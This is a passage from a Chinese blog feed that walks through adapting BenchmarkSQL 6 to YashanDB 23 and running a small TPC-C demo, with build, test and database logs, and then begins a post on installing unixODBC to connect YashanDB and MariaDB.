<span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from Flask-&gt;-r requirements.txt (line 4)) (8.0.4)</span><br><span class="line">Requirement already satisfied: Werkzeug&gt;=2.0 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from Flask-&gt;-r requirements.txt (line 4)) (2.0.3)</span><br><span class="line">Requirement already satisfied: Jinja2&gt;=3.0 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from Flask-&gt;-r requirements.txt (line 4)) (3.0.3)</span><br><span class="line">Requirement already satisfied: itsdangerous&gt;=2.0 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from Flask-&gt;-r requirements.txt (line 4)) (2.0.1)</span><br><span class="line">Requirement already satisfied: pillow&gt;=6.2.0 <span class="keyword">in</span> /usr/local/lib64/python3.6/site-packages (from matplotlib-&gt;-r requirements.txt (line 6)) (8.4.0)</span><br><span class="line">Requirement already satisfied: python-dateutil&gt;=2.1 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from matplotlib-&gt;-r requirements.txt (line 6)) (2.8.2)</span><br><span class="line">Requirement already satisfied: cycler&gt;=0.10 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from matplotlib-&gt;-r requirements.txt (line 6)) (0.11.0)</span><br><span class="line">Requirement already satisfied: kiwisolver&gt;=1.0.1 <span class="keyword">in</span> /usr/local/lib64/python3.6/site-packages (from matplotlib-&gt;-r requirements.txt (line 6)) (1.3.1)</span><br><span class="line">Requirement already satisfied: pyparsing!=2.0.4,!=2.1.2,!=2.1.6,&gt;=2.0.3 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from matplotlib-&gt;-r requirements.txt (line 6)) (2.4.7)</span><br><span class="line">Requirement already satisfied: six~=1.13 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from jproperties-&gt;-r requirements.txt (line 8)) (1.15.0)</span><br><span class="line">Requirement already satisfied: importlib-metadata <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from click&gt;=7.1.2-&gt;Flask-&gt;-r requirements.txt (line 4)) (4.8.3)</span><br><span class="line">Requirement already satisfied: MarkupSafe&gt;=2.0 <span class="keyword">in</span> /usr/local/lib64/python3.6/site-packages (from Jinja2&gt;=3.0-&gt;Flask-&gt;-r requirements.txt (line 4)) (2.0.1)</span><br><span class="line">Requirement already satisfied: dataclasses <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from Werkzeug&gt;=2.0-&gt;Flask-&gt;-r requirements.txt (line 4)) (0.8)</span><br><span class="line">Requirement already satisfied: zipp&gt;=0.5 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from importlib-metadata-&gt;click&gt;=7.1.2-&gt;Flask-&gt;-r requirements.txt (line 4)) (3.6.0)</span><br><span class="line">Requirement already satisfied: typing-extensions&gt;=3.6.4 <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from importlib-metadata-&gt;click&gt;=7.1.2-&gt;Flask-&gt;-r requirements.txt (line 4)) (4.1.1)</span><br></pre></td></tr></table></figure></div>
<h2 id="兼容性适配">兼容性适配</h2>
<p>我已经将适配后的 BenchmarkSQL 上传到 Gitee: <a class="link"   href="https://gitee.com/shawnyan/benchmarksql4yas/" >https://gitee.com/shawnyan/benchmarksql4yas/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>具体修改内容，可以从提交履历中一目了然，比如：</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-496ae0dc-7ed3-4214-aade-de33bf415a2d.png"
                      referrerpolicy="no-referrer"
                >
<p>这里主要强调三点，</p>
<ol>
<li>与 YashanDB 官方文档中介绍有差异，不再一一罗列修改了什么，而是直接提供适配后的源码。</li>
<li>由于 YashanDB 高度兼容 Oracle，所以在适配 BenchmarkSQL 过程中，主要以 Oracle 的部分为模板，建表语句是相同的。</li>
<li>BenchmarkSQL 使用的是 JDBC 连接数据库，使用时，需要修改配置文件的连接信息，模板如下：</li>
</ol>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">db=yashandb</span></span><br><span class="line"><span class="string">driver=com.yashandb.jdbc.Driver</span></span><br><span class="line"><span class="string">application=Generic</span></span><br><span class="line"><span class="string">conn=jdbc:yasdb://127.0.0.1:1688/yandb</span></span><br><span class="line"><span class="string">user=yandb</span></span><br><span class="line"><span class="string">password=123</span></span><br></pre></td></tr></table></figure></div>
<p>适配完成后，再次编译源码，成功。</p>
<!--
export JAVA_TOOL_OPTIONS=-Dfile.encoding=UTF8
-->
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan benchmarksql]<span class="comment"># mvn</span></span><br><span class="line">Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF8</span><br><span class="line">[INFO] Scanning <span class="keyword">for</span> projects...</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] Some problems were encountered <span class="keyword">while</span> building the effective model <span class="keyword">for</span> com.github.pgsql-io:benchmarksql:jar:6.0.0-SNAPSHOT</span><br><span class="line">[WARNING] <span class="string">&#x27;dependencies.dependency.systemPath&#x27;</span> <span class="keyword">for</span> com.yashandb.jdbc:yashandb-jdbc:jar should not point at files within the project directory, <span class="variable">$&#123;project.basedir&#125;</span>/lib/yashandb-jdbc-1.5.1.jar will be unresolvable by dependent projects @ line 91, column 16</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.</span><br><span class="line">[WARNING] </span><br><span class="line">[INFO] </span><br><span class="line">[INFO] ------------------&lt; com.github.pgsql-io:benchmarksql &gt;------------------</span><br><span class="line">[INFO] Building A TPC-C like <span class="built_in">test</span> tool 6.0.0-SNAPSHOT</span><br><span class="line">[INFO]   from pom.xml</span><br><span class="line">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- resources:3.2.0:resources (default-resources) @ benchmarksql ---</span><br><span class="line">[INFO] Using <span class="string">&#x27;UTF-8&#x27;</span> encoding to copy filtered resources.</span><br><span class="line">[INFO] Using <span class="string">&#x27;UTF-8&#x27;</span> encoding to copy filtered properties files.</span><br><span class="line">[INFO] Copying 66 resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- compiler:3.8.0:compile (default-compile) @ benchmarksql ---</span><br><span class="line">[INFO] Changes detected - recompiling the module!</span><br><span class="line">[INFO] Compiling 19 <span class="built_in">source</span> files to /root/benchmarksql/target/classes</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- resources:3.2.0:testResources (default-testResources) @ benchmarksql ---</span><br><span class="line">[INFO] Using <span class="string">&#x27;UTF-8&#x27;</span> encoding to copy filtered resources.</span><br><span class="line">[INFO] Using <span class="string">&#x27;UTF-8&#x27;</span> encoding to copy filtered properties files.</span><br><span class="line">[INFO] skip non existing resourceDirectory /root/benchmarksql/src/test/resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- compiler:3.8.0:testCompile (default-testCompile) @ benchmarksql ---</span><br><span class="line">[INFO] No sources to compile</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- surefire:3.2.2:<span class="built_in">test</span> (default-test) @ benchmarksql ---</span><br><span class="line">[INFO] No tests to run.</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- jar:2.4:jar (default-jar) @ benchmarksql ---</span><br><span class="line">[INFO] Building jar: /root/benchmarksql/target/BenchmarkSQL.jar</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- dependency:3.0.0:copy-dependencies (copy-dependencies) @ benchmarksql ---</span><br><span class="line">[INFO] Copying postgresql-42.2.19.jar to /root/benchmarksql/target/lib/postgresql-42.2.19.jar</span><br><span class="line">[INFO] Copying jcc-11.5.5.0.jar to /root/benchmarksql/target/lib/jcc-11.5.5.0.jar</span><br><span class="line">[INFO] Copying mysql-connector-java-8.0.23.jar to /root/benchmarksql/target/lib/mysql-connector-java-8.0.23.jar</span><br><span class="line">[INFO] Copying yashandb-jdbc-1.5.1.jar to /root/benchmarksql/target/lib/yashandb-jdbc-1.5.1.jar</span><br><span class="line">[INFO] Copying ant-1.8.2.jar to /root/benchmarksql/target/lib/ant-1.8.2.jar</span><br><span class="line">[INFO] Copying protobuf-java-3.11.4.jar to /root/benchmarksql/target/lib/protobuf-java-3.11.4.jar</span><br><span class="line">[INFO] Copying jaybird-4.0.3.java11.jar to /root/benchmarksql/target/lib/jaybird-4.0.3.java11.jar</span><br><span class="line">[INFO] Copying mssql-jdbc-9.2.1.jre8.jar to /root/benchmarksql/target/lib/mssql-jdbc-9.2.1.jre8.jar</span><br><span class="line">[INFO] Copying antlr4-runtime-4.7.2.jar to /root/benchmarksql/target/lib/antlr4-runtime-4.7.2.jar</span><br><span class="line">[INFO] Copying log4j-api-2.14.1.jar to /root/benchmarksql/target/lib/log4j-api-2.14.1.jar</span><br><span class="line">[INFO] Copying ojdbc8-21.1.0.0.jar to /root/benchmarksql/target/lib/ojdbc8-21.1.0.0.jar</span><br><span class="line">[INFO] Copying ant-launcher-1.8.2.jar to /root/benchmarksql/target/lib/ant-launcher-1.8.2.jar</span><br><span class="line">[INFO] Copying connector-api-1.5.jar to /root/benchmarksql/target/lib/connector-api-1.5.jar</span><br><span class="line">[INFO] Copying checker-qual-3.5.0.jar to /root/benchmarksql/target/lib/checker-qual-3.5.0.jar</span><br><span class="line">[INFO] Copying log4j-core-2.14.1.jar to /root/benchmarksql/target/lib/log4j-core-2.14.1.jar</span><br><span class="line">[INFO] Copying mariadb-java-client-2.7.2.jar to /root/benchmarksql/target/lib/mariadb-java-client-2.7.2.jar</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time:  9.218 s</span><br><span class="line">[INFO] Finished at: 2023-12-03T20:15:17+08:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[root@shawnyan benchmarksql]<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>编译成功后，可以看到生成了 target 文件夹。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan target]<span class="comment"># ll</span></span><br><span class="line">total 108</span><br><span class="line">-rw-r--r--  1 root root 100144 Dec  3 20:15 BenchmarkSQL.jar</span><br><span class="line">drwxr-xr-x  3 root root     17 Dec  3 20:15 classes</span><br><span class="line">drwxr-xr-x  3 root root     25 Dec  3 20:15 generated-sources</span><br><span class="line">drwxr-xr-x  2 root root   4096 Dec  3 20:15 lib</span><br><span class="line">drwxr-xr-x  2 root root     28 Dec  3 20:15 maven-archiver</span><br><span class="line">drwxr-xr-x  3 root root     35 Dec  3 20:15 maven-status</span><br><span class="line">drwxr-xr-x 13 root root   4096 Dec  3 20:23 run</span><br></pre></td></tr></table></figure></div>
<!--
mkdir -p /service_data /benchmarksql
cp BenchmarkSQL.jar /benchmarksql/
mv run lib /benchmarksql/

chmod +x /benchmarksql/run/*.sh
chmod +x /benchmarksql/run/*.py

mkdir -p /benchmarksql/.config/matplotlib
chmod 777 /benchmarksql/.config/matplotlib
-->
<p>到此，YashanDB 23 与 BenchmarkSQL 6 兼容性适配的相关内容已介绍完毕，下面做个小演示 Demo。</p>
<h2 id="性能测试">性能测试</h2>
<h3 id="测试步骤">测试步骤</h3>
<ul>
<li>创建测试用户</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> yandb IDENTIFIED <span class="keyword">BY</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">GRANT</span> DBA <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ANY</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> SEQUENCE <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> SESSION <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CREATE</span> TYPE <span class="keyword">TO</span> yandb;</span><br><span class="line"><span class="keyword">GRANT</span> UNLIMITED TABLESPACE <span class="keyword">TO</span> yandb;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>启动服务</li>
</ul>
<p>前文提及了 BenchmarkSQL 已经提供了 Web 服务，可以通过浏览器进行访问操作，先来启动服务：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">python3 /benchmarksql/run/FlaskService/main.py</span><br></pre></td></tr></table></figure></div>
<ul>
<li>导入配置文件</li>
</ul>
<p>在浏览器中导入配置文件，具体内容参见工程文件 <code>sample.yashandb.properties</code>，注意数据库连接信息：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">conn=jdbc:yasdb://127.0.0.1:1688/yandb</span></span><br><span class="line"><span class="string">user=yandb</span></span><br><span class="line"><span class="string">password=123</span></span><br></pre></td></tr></table></figure></div>
<img  alt="imgbenchmarkyashan1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-4c841bf3-516e-46d8-9b85-925b80337a5e.png"
                      referrerpolicy="no-referrer"
                >
<p>这里只是流程演示，所以调小了这两个参数，以节省时间：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">warehouses=2</span></span><br><span class="line"><span class="string">runMins=1</span></span><br></pre></td></tr></table></figure></div>
<h3 id="测试日志">测试日志</h3>
<p>测试过程中，产生了一些测试日志。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Current/Last Job Output</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.yashandb/tableCreates.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">2023-12-03 20:19:02,472  INFO - create table bmsql_config (</span><br><span class="line">cfg_name    varchar2(30) primary key,</span><br><span class="line">cfg_value   varchar2(50)</span><br><span class="line">);</span><br><span class="line">...</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/storedProcedureCreates.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">2023-12-03 20:19:08,595  INFO - -- ----------------------------------------------------------------------</span><br><span class="line">2023-12-03 20:19:08,605  INFO - -- This is a placeholder for databases, that don&#x27;t support</span><br><span class="line">2023-12-03 20:19:08,605  INFO - -- stored procedures or where the support is too limited to</span><br><span class="line">2023-12-03 20:19:08,606  INFO - -- reasonably implement the TPCC transaction profiles.</span><br><span class="line">2023-12-03 20:19:08,606  INFO - -- ----------------------------------------------------------------------</span><br><span class="line">2023-12-03 20:19:10,823  INFO - Starting BenchmarkSQL LoadData</span><br><span class="line">2023-12-03 20:19:10,832  INFO - </span><br><span class="line">2023-12-03 20:19:10,834  INFO - random initialized</span><br><span class="line">2023-12-03 20:19:10,840  INFO - driver=com.yashandb.jdbc.Driver</span><br><span class="line">2023-12-03 20:19:10,884  INFO - conn=jdbc:yasdb://127.0.0.1:1688/yandb</span><br><span class="line">2023-12-03 20:19:10,884  INFO - user=yandb</span><br><span class="line">2023-12-03 20:19:10,884  INFO - password=***********</span><br><span class="line">...</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/indexCreates.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">2023-12-03 20:20:24,343  INFO - alter table bmsql_warehouse add constraint bmsql_warehouse_pkey</span><br><span class="line">primary key (w_id);</span><br><span class="line">...</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/foreignKeys.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">2023-12-03 20:20:29,379  INFO - alter table bmsql_district add constraint d_warehouse_fkey</span><br><span class="line">foreign key (d_w_id)</span><br><span class="line">references bmsql_warehouse (w_id);</span><br><span class="line">...</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line"># Loading SQL file ./sql.common/buildFinish.sql</span><br><span class="line"># ------------------------------------------------------------</span><br><span class="line">2023-12-03 20:21:07,512  INFO - -- ----</span><br><span class="line">2023-12-03 20:21:07,521  INFO - -- Extra commands to run after the tables are created, loaded,</span><br><span class="line">2023-12-03 20:21:07,521  INFO - -- indexes built and extra&#x27;s created.</span><br><span class="line">2023-12-03 20:21:07,522  INFO - -- ----</span><br></pre></td></tr></table></figure></div>
<img  alt="imgbenchmarkyashan2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-eace1e56-02f0-4bb7-807c-1b7d727f1a8c.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="负载信息">负载信息</h3>
<p>测试过程中，YashanDB 和 BenchmarkSQL 的运行载荷都正常。</p>
<img  alt="imgbenchmarkyashan3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-c4d9fc68-5d3a-461d-af7c-c7d447dc4ee2.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="YashanDB-数据库日志">YashanDB 数据库日志</h3>
<p>测试过程中，YashanDB 数据库也产生了若干日志。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">tailf /home/yashan/yashandb/yasdb_data/log/run/run.log</span><br><span class="line"></span><br><span class="line">2023-12-03 17:09:08.664 20590 [INFO] [USER] create user success, name: YANDB, <span class="built_in">id</span>: 4, version: 0</span><br><span class="line">2023-12-03 17:09:08.665 20590 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -6</span><br><span class="line">2023-12-03 17:09:08.669 20590 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -500</span><br><span class="line">2023-12-03 17:09:08.672 20590 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -24</span><br><span class="line">2023-12-03 17:09:09.068 20590 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -19</span><br><span class="line">2023-12-03 20:16:54.004 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -505</span><br><span class="line">2023-12-03 20:16:57.968 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -55</span><br><span class="line">2023-12-03 20:17:01.648 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -35</span><br><span class="line">2023-12-03 20:17:30.265 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -60</span><br><span class="line">2023-12-03 20:17:34.280 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -73</span><br><span class="line">2023-12-03 20:17:38.696 31354 [INFO] [ROLE] grant action succeed, granteeId: 4, granteeType: 1, granteeName: YANDB, grantRole: -48</span><br><span class="line">2023-12-03 20:19:17.556 31598 [INFO] [REDO] switch redo file, new asn 3</span><br><span class="line">2023-12-03 20:19:18.357 31598 [INFO] [TABLESPACE] try to update instance 0 <span class="string">&#x27;s space change lsn from 3354 to 11816 </span></span><br><span class="line"><span class="string">2023-12-03 20:19:26.645 31596 [INFO] [TABLESPACE] try to update instance 0 &#x27;</span>s space change lsn from 11816 to 26227 </span><br><span class="line">2023-12-03 20:19:29.423 31606 [INFO] [TABLESPACE] try to update instance 0 <span class="string">&#x27;s space change lsn from 26227 to 33482 </span></span><br><span class="line"><span class="string">2023-12-03 20:19:29.525 31601 [INFO] [REDO] switch redo file, new asn 4</span></span><br><span class="line"><span class="string">2023-12-03 20:19:37.339 31598 [INFO] [TABLESPACE] try to update instance 0 &#x27;</span>s space change lsn from 33482 to 59036 </span><br><span class="line">2023-12-03 20:19:45.199 31611 [INFO] [TABLESPACE] try to update instance 0 <span class="string">&#x27;s space change lsn from 59036 to 77321 </span></span><br><span class="line"><span class="string">2023-12-03 20:19:52.848 31592 [INFO] [TABLESPACE] try to update instance 0 &#x27;</span>s space change lsn from 77321 to 97789 </span><br><span class="line">2023-12-03 20:20:01.215 31601 [INFO] [TABLESPACE] try to update instance 0 <span class="string">&#x27;s space change lsn from 97789 to 116250 </span></span><br><span class="line"><span class="string">2023-12-03 20:20:01.743 31592 [INFO] [REDO] switch redo file, new asn 5</span></span><br><span class="line"><span class="string">2023-12-03 20:20:09.891 31604 [INFO] [TABLESPACE] try to update instance 0 &#x27;</span>s space change lsn from 116250 to 142015 </span><br><span class="line">2023-12-03 20:20:18.354 31592 [INFO] [TABLESPACE] try to update instance 0 <span class="string">&#x27;s space change lsn from 142015 to 169831 </span></span><br><span class="line"><span class="string">2023-12-03 20:20:24.967 31820 [INFO] [TABLESPACE] try to update instance 0 &#x27;</span>s space change lsn from 169831 to 180502 </span><br></pre></td></tr></table></figure></div>
<p>连接数据库查看 REDO 日志文件情况。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> THREAD#,ID,NAME,BLOCK_SIZE,BLOCK_COUNT,USED_BLOCKS,SEQUENCE#,STATUS <span class="keyword">from</span> V$LOGFILE;</span><br><span class="line"></span><br><span class="line">THREAD#           ID NAME                                                               BLOCK_SIZE  BLOCK_COUNT  USED_BLOCKS    SEQUENCE# STATUS    </span><br><span class="line"><span class="comment">------- ------------ ---------------------------------------------------------------- ------------ ------------ ------------ ------------ --------- </span></span><br><span class="line">      <span class="number">1</span>            <span class="number">0</span> <span class="operator">/</span>home<span class="operator">/</span>yashan<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo0                           <span class="number">4096</span>        <span class="number">25600</span>        <span class="number">25481</span>            <span class="number">5</span> <span class="keyword">CURRENT</span>  </span><br><span class="line">      <span class="number">1</span>            <span class="number">1</span> <span class="operator">/</span>home<span class="operator">/</span>yashan<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo1                           <span class="number">4096</span>        <span class="number">25600</span>        <span class="number">25549</span>            <span class="number">2</span> INACTIVE </span><br><span class="line">      <span class="number">1</span>            <span class="number">2</span> <span class="operator">/</span>home<span class="operator">/</span>yashan<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo2                           <span class="number">4096</span>        <span class="number">25600</span>        <span class="number">25600</span>            <span class="number">3</span> INACTIVE </span><br><span class="line">      <span class="number">1</span>            <span class="number">3</span> <span class="operator">/</span>home<span class="operator">/</span>yashan<span class="operator">/</span>yashandb<span class="operator">/</span>yasdb_data<span class="operator">/</span>dbfiles<span class="operator">/</span>redo3                           <span class="number">4096</span>        <span class="number">25600</span>        <span class="number">25600</span>            <span class="number">4</span> INACTIVE </span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> fetched.</span><br></pre></td></tr></table></figure></div>
<h3 id="测试结果">测试结果</h3>
<p>测试完成后，页面会打印出相关信息。</p>
<img  alt="imgbenchmarkyashan4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-3667a1c7-596a-4f18-a06b-e18828c5bc4d.png"
                      referrerpolicy="no-referrer"
                >
<p>并提示生成了测试报告。</p>
<img  alt="imgbenchmarkyashan5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-9ff14142-a28f-4f81-94b4-88bfd29a3d40.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="imgbenchmarkyashan6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-3f1e1bb4-2628-40e0-b501-a97c15590609.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，全部演示已完成。</p>
<h2 id="总结">总结</h2>
<p>YashanDB 个人版的推出，吸引了诸多 DBA 大神下场评测，这些天看到了诸多分享，与个人而言也是受益颇多。</p>
<p>YashanDB 的“横空出世”，给国产数据库增添了新的活力，我们也看到了最近半年 YashanDB 的“火爆”，希望继续保持。</p>
<img  alt="20231204_074414.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231204-e8c2487e-8bff-4e9a-82aa-0967fac3aee4.png"
                      referrerpolicy="no-referrer"
                >
<p>本文所做的适配工程已开源，可供感兴趣的同学下载测试，只是个人版的测试数据仅供参考，还是期待可以体验到 YashanDB 标准版或企业版。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>YashanDB</category>
      </categories>
      <tags>
        <tag>yashandb</tag>
        <tag>benchmarksql</tag>
      </tags>
  </entry>
  <entry>
    <title>「YashanDB个人版体验」通过 ODBC 连接 YashanDB 和 MariaDB</title>
    <url>/2023/yashan/yashandb-odbc/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>前文介绍了如何搭建 YashanDB 个人版，本文将介绍如何通过 ODBC 连接 YashanDB 数据库，并介绍如何将 MairaDB 和 YashanDB 数据库进行互连。</p>
<ul>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-install/">「YashanDB个人版体验」YashanDB 个人版安装初体验</a></li>
</ul>
<!--
- [「YashanDB个人版体验」YashanDB 个人版安装初体验](https://www.modb.pro/db/1719038517697929216)
-->
<h2 id="环境信息">环境信息</h2>
<ol>
<li>Rocky Linux 9.3</li>
<li>YashanDB 23.1 个人版</li>
<li>MariaDB 10.6.16</li>
</ol>
<h2 id="安装-unixODBC">安装 unixODBC</h2>
<p>在 Linux 环境下，通过 ODBC 连接 YashanDB 数据库，需要先安装 unixODBC 依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dnf install unixODBC unixODBC-devel</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ sudo dnf install unixODBC unixODBC-devel</span><br><span class="line">Dependencies resolved.</span><br><span class="line">=========================================================================================================================</span><br><span class="line"> Package                         Architecture            Version                        Repository                  Size</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> unixODBC                        x86_64                  2.3.9-4.el9                    appstream                  458 k</span><br><span class="line"> unixODBC-devel                  x86_64                  2.3.9-4.el9                    crb                         50 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">=========================================================================================================================</span><br><span class="line">Install  2 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 508 k</span><br><span class="line">Installed size: 1.6 M</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/2): unixODBC-devel-2.3.9-4.el9.x86_64.rpm                                             118 kB/s |  50 kB     00:00</span><br><span class="line">(2/2): unixODBC-2.3.9-4.el9.x86_64.rpm                                                   789 kB/s | 458 kB     00:00</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">Total                                                                                    867 kB/s | 508 kB     00:00</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                                                                 1/1</span><br><span class="line">  Installing       : unixODBC-2.3.9-4.el9.x86_64                                                                     1/2</span><br><span class="line">  Installing       : unixODBC-devel-2.3.9-4.el9.x86_64                                                               2/2</span><br><span class="line">  Running scriptlet: unixODBC-devel-2.3.9-4.el9.x86_64                                                               2/2</span><br><span class="line">  Verifying        : unixODBC-2.3.9-4.el9.x86_64                                                                     1/2</span><br><span class="line">  Verifying        : unixODBC-devel-2.3.9-4.el9.x86_64                                                               2/2</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  unixODBC-2.3.9-4.el9.x86_64                              